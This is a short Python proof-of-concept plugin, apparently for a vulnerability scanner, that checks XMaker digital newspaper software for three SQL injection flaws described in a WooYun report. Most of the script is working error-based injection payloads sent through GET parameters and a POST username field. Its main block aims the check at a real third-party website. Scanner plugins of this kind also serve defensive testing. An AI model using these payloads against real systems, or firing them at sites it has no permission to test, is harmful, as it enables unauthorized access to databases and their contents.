#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : XMaker数字报纸通用型注入漏洞 3处
Author    :  a
mail      :  a@lcx.cc
 
refer     : http://www.wooyun.org/bugs/wooyun-2015-0114482


"""
def assign(service, arg):
    if service == 'xplus':
        return True, arg
def audit(arg):
    ps = ["www/index.php?mod=admin&con=deliver&act=view&deliId=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--" ,# userId参数存在报错注入
          'www/index.php?mod=admin&con=user&act=view&id=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--',   
        ]
    for p in ps:
        url = arg + p
        code2, head, res, errcode, _ = curl.curl2(url )
        if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
             security_hole(url)

    p = 'www/index.php?mod=admin&con=subscribe&act=unsubscribelist'
    d = 'username=12\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--'
    url = arg + p
    code2, head, res, errcode, _ = curl.curl2(url,post=d)
     
    if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('GAO JI' in res):
        security_hole(url)
    

if __name__ == '__main__':
    from dummy import *
    #audit(assign('xplus', 'http://smrb.smnet.com.cn')[1])
    audit(assign('xplus', 'http://news.xd56b.com/')[1])